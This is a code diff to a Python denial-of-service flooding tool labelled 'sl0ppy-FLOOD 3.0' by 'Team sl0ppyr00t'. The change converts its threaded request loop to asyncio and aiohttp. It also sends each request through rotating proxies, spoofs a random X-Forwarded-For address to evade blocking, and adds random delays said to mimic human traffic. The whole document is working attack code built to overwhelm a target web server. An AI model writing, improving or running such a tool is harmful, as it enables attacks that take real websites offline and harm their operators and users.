@@ -10,6 +10,8 @@ import os
 import random
 import string
 import sys
+import asyncio
+import aiohttp
 import threading
 import time
 import urllib.request
@@ -8223,6 +8225,7 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"	        			
 			]
 			
+
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
@@ -8242,50 +8245,41 @@ class Spammer(threading.Thread):
         self.Lock = threading.Lock()
         self.lista = lista
 
-    def request(self):
+    async def request(self, session):
         global N
         data = None
         if N >= (len(self.lista) - 1):
             N = 0
-        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
-        opener = urllib.request.build_opener(proxy)
-        urllib.request.install_opener(opener)
-        req = urllib.request.Request(self.url, data, self.headers)
-        urllib.request.urlopen(req)
+        proxy = self.lista[N]
+        headers = self.headers.copy()
+        headers['X-Forwarded-For'] = '.'.join(str(random.randint(0, 255)) for _ in range(4))
+        async with session.get(self.url, data=data, headers=headers, proxy=proxy) as response:
+            await response.read()
 
         print(Fore.RED + "0000000000000000000000000000")
         print(Fore.YELLOW + "DDoS, By Team sl0ppyr00t!!")
         print(Fore.RED + "0000000000000000000000000000")
         print(Style.RESET_ALL, end="")
 
-        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{self.lista[N]}")
+        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{proxy}")
         sys.stdout.flush()
         sys.stdout.write("\r")
 
-    def run(self):
+    async def run(self):
         global N
         self.Lock.acquire()
         print("Thread #%4d |" % self.num)
         self.Lock.release()
-        time.sleep(1)
-        while True:
-            try:
-                N += 1
-                self.request()
-                # Add random delay to simulate human behavior
-                time.sleep(random.uniform(0.1, 0.5))
-            except:
-                pass
-        sys.exit(0)
-
-def title():
-    sys.stdout.write("                                                                                          \n")
-    sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
-    sys.stdout.write("             " + "0             sl0ppy-FLOOD 3.0              ""          0\n")
-    sys.stdout.write("             " + "0        ADDED NEW METHOD AND BYPASS    ""              0\n")
-    sys.stdout.write("             " + "0        ADDED NEW UA + Custom UA           ""          0\n")
-    sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
-    sys.stdout.write("\n")
+        await asyncio.sleep(1)
+        async with aiohttp.ClientSession() as session:
+            while True:
+                try:
+                    N += 1
+                    await self.request(session)
+                    # Add random delay to simulate human behavior
+                    await asyncio.sleep(random.uniform(0.1, 0.5))
+                except:
+                    pass
 
 class MainLoop():
     def __init__(self):
@@ -8338,8 +8332,9 @@ class MainLoop():
             except:
                 print('Invalid input. Please enter a number.')
 
-        for i in range(num_threads):
-            Spammer(url, i + 1, proxy_list).start()
+        loop = asyncio.get_event_loop()
+        tasks = [Spammer(url, i + 1, proxy_list).run() for i in range(num_threads)]
+        loop.run_until_complete(asyncio.gather(*tasks))
 
 if __name__ == '__main__':
     N = 0
